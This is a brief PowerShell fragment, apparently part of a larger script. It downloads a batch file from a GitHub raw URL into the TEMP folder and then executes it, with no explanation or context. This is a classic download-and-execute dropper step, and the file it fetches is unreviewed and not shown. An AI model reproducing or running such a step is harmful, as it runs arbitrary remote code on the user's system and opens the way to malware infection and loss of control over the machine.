$url4 = "https://github.com/cia168168/folder/raw/main/fake/test.bat"
$output4 = "$env:TEMP\test.bat"

# Download the batch file
Invoke-WebRequest -Uri $url4 -OutFile $output4

# Execute the batch file
Start-Process -FilePath $output4 -Wait